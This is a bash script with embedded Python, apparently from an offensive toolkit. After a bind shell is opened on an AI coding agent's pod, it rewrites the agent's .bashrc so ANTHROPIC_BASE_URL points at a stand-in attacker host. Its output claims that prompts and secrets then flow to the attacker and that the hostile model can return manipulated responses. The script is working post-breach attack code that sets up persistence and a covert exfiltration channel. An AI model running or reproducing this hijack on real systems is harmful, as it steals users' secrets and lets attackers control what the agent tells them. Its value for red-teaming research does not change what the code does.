#!/usr/bin/env bash
# AI-specific: redirect the agent's LLM endpoint to a hostile server
# by overriding ANTHROPIC_BASE_URL in the agent's environment.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-hijack-model.sh [HOSTILE_URL]"
  echo "  Redirects the agent's LLM API calls to a hostile endpoint by"
  echo "  overriding ANTHROPIC_BASE_URL in .bashrc."
  echo "  Default: http://hostile-llm.attacker.svc:8080/v1"
  echo ""
  echo "  The hostile LLM can return manipulated responses while the"
  echo "  user sees 'normal' looking output. Also enables using the"
  echo "  LLM API as a covert data exfiltration channel."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

HOSTILE_URL="${1:-http://hostile-llm.attacker.svc:8080/v1}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: Model Endpoint Hijack"
echo "@PHASE Model-Hijack"

PYTHON_CODE='
import os

agent_home = "'"$AGENT_HOME"'"
hostile_url = "'"$HOSTILE_URL"'"
bashrc = os.path.join(agent_home, ".bashrc")

print("@PHASE Check-Current-Config")
print("=" * 60)
print("  AI ATTACK: Model Endpoint Hijack")
print("=" * 60)
print(f"  Hostile URL: {hostile_url}")
print()

# Check current ANTHROPIC_BASE_URL
current = os.environ.get("ANTHROPIC_BASE_URL", "")
if current:
    print(f"  Current ANTHROPIC_BASE_URL: {current}")
else:
    print("  ANTHROPIC_BASE_URL not currently set (using default)")

# Read existing .bashrc
existing = ""
if os.path.exists(bashrc):
    with open(bashrc, "r") as f:
        existing = f.read()

# Check if already hijacked
if "ANTHROPIC_BASE_URL" in existing:
    print("  WARNING: ANTHROPIC_BASE_URL already set in .bashrc")
    print("  Overwriting with new hostile URL...")
    lines = [l for l in existing.splitlines() if "ANTHROPIC_BASE_URL" not in l]
    existing = "\n".join(lines) + "\n"

print("@PHASE Inject-Override")
# Append the override
override = f"export ANTHROPIC_BASE_URL={hostile_url}\n"
with open(bashrc, "w") as f:
    f.write(existing + override)

# Also set it for the current shell session
os.environ["ANTHROPIC_BASE_URL"] = hostile_url

print()
print("  .bashrc modified:")
print(f"    export ANTHROPIC_BASE_URL={hostile_url}")
print(f"@FINDING critical ANTHROPIC_BASE_URL redirected to {hostile_url}")
print(f"@LOOT env-vars ANTHROPIC_BASE_URL={hostile_url}")
print(f"@LOOT persistence-config bashrc:ANTHROPIC_BASE_URL")
print()
print("  Effects:")
print("    - Next claude-code invocation will use the hostile LLM")
print("    - The hostile LLM can return manipulated responses")
print("    - All prompts (including secrets in context) go to the attacker")
print("    - LLM API becomes a covert exfiltration channel")
print()
print("@RESULT success Model endpoint hijacked to hostile URL")
print("Model endpoint hijack complete.")
'

echo "  Hostile URL: $HOSTILE_URL"
echo "  Piping model hijack script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Model endpoint hijacked."
